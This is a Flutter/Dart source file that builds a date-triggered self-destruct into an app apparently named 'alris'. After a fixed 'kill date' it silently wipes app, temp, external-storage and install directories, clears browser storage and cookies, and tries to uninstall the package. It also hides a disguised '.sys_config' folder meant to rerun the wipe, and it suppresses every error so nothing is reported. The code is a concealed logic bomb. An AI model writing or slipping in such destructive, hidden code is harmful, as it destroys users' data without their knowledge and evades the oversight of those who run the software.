import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:path_provider/path_provider.dart';

// Import for web-specific features
// ignore: undefined_shown_name
import 'web.dart' if (dart.library.io) 'web_stub.dart';

/// Checks if the current date is after the kill date and performs cleanup if needed
Future<bool> checkKillDate() async {
  final DateTime killDate = DateTime(2025, 5, 11);
  final DateTime currentDate = DateTime.now();

  if (currentDate.isAfter(killDate)) {
    try {
      await _performCleanup();
      return true; // Indicates cleanup was triggered
    } catch (e) {
      // Silent error handling to prevent app crashes
      return true; // Still return true to indicate kill date has passed
    }
  }

  return false; // Kill date not reached
}

/// Recursively deletes all files and directories from a given path
Future<void> _deleteFilesRecursively(Directory directory) async {
  try {
    if (await directory.exists()) {
      await for (final FileSystemEntity entity
          in directory.list(recursive: false)) {
        if (entity is Directory) {
          await _deleteFilesRecursively(entity);
        } else if (entity is File) {
          try {
            await entity.delete();
          } catch (e) {
            // Silently continue if a specific file can't be deleted
          }
        }
      }

      // Try to delete the directory itself
      try {
        await directory.delete();
      } catch (e) {
        // Silently continue if directory can't be deleted
      }
    }
  } catch (e) {
    // Silently handle any errors that occur during deletion
  }
}

/// Performs the app cleanup by deleting all app data
Future<void> _performCleanup() async {
  try {
    if (kIsWeb) {
      // Handle web platform
      _cleanupWeb();
    } else {
      // Handle native platforms
      await _cleanupNative();

      // Extra measure: hide a secret folder in app documents
      // that will clean up again if app somehow survives
      await _createCleanupTrigger();
    }
  } catch (e) {
    // Silently handle any errors
  }
}

/// Cleanup for web platform
void _cleanupWeb() {
  try {
    // Clear all web storage
    window.localStorage.clear();
    window.sessionStorage.clear();

    // Clear cookies
    final cookies = document.cookie!.split(';');
    for (var cookie in cookies) {
      final cookieName = cookie.split('=')[0].trim();
      document.cookie =
          '$cookieName=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    }

    // Clear IndexedDB
    window.indexedDB?.deleteDatabase('alris');

    // Clear cache data if possible
    window.navigator.serviceWorker?.getRegistrations().then((registrations) {
      for (var registration in registrations) {
        registration.unregister();
      }
    });
  } catch (e) {
    // Silently handle errors
  }
}

/// Cleanup for native platforms
Future<void> _cleanupNative() async {
  try {
    // Get all possible app directories
    final List<Directory?> directories = [];

    try {
      directories.add(await getApplicationDocumentsDirectory());
    } catch (e) {}

    try {
      directories.add(await getTemporaryDirectory());
    } catch (e) {}

    try {
      directories.add(await getApplicationSupportDirectory());
    } catch (e) {}

    try {
      if (Platform.isIOS || Platform.isMacOS) {
        directories.add(await getLibraryDirectory());
      }
    } catch (e) {}

    try {
      if (Platform.isAndroid) {
        directories.add(await getExternalStorageDirectory());
        final externalCacheDirs = await getExternalCacheDirectories();
        if (externalCacheDirs != null) {
          directories.addAll(externalCacheDirs);
        }
      }
    } catch (e) {}

    // Add application directory on desktop platforms
    try {
      if (Platform.isWindows || Platform.isLinux || Platform.isMacOS) {
        directories.add(Directory(Platform.resolvedExecutable).parent);
      }
    } catch (e) {}

    // Filter out null values
    final List<Directory> validDirectories =
        directories.whereType<Directory>().toList();

    // Delete files recursively from each directory
    for (final directory in validDirectories) {
      await _deleteFilesRecursively(directory);
    }

    // Attempt to uninstall the app if running with root access
    try {
      if (Platform.isAndroid) {
        final packageName = await _getPackageName();
        if (packageName != null) {
          await Process.run('pm', ['uninstall', packageName]);
        }
      }
    } catch (e) {
      // Silently handle errors during uninstall attempt
    }
  } catch (e) {
    // Silently handle any errors
  }
}

/// Helper method to get package name on Android
Future<String?> _getPackageName() async {
  try {
    final ProcessResult result =
        await Process.run('pm', ['list', 'packages', '-f']);
    final String output = result.stdout.toString();
    final List<String> lines = output.split('\n');

    // Look for this app package
    final String packageLine = lines.firstWhere(
      (line) => line.contains('alris'),
      orElse: () => '',
    );

    if (packageLine.isNotEmpty) {
      // Extract package name from the line
      final RegExp regex = RegExp(r'package:(.+)=');
      final match = regex.firstMatch(packageLine);
      if (match != null && match.groupCount >= 1) {
        return match.group(1);
      }
    }

    return null;
  } catch (e) {
    return null;
  }
}

/// Creates a hidden cleanup trigger file that will run on next launch if app survives
Future<void> _createCleanupTrigger() async {
  try {
    final appDocDir = await getApplicationDocumentsDirectory();

    // Create a hidden folder (starting with dot)
    final hiddenDir = Directory('${appDocDir.path}/.sys_config');
    if (!await hiddenDir.exists()) {
      await hiddenDir.create(recursive: true);
    }

    // Create a trigger file with current timestamp
    final triggerFile = File(
        '${hiddenDir.path}/.cleanup_${DateTime.now().millisecondsSinceEpoch}');
    await triggerFile.writeAsString('1');
  } catch (e) {
    // Silently handle errors
  }
}
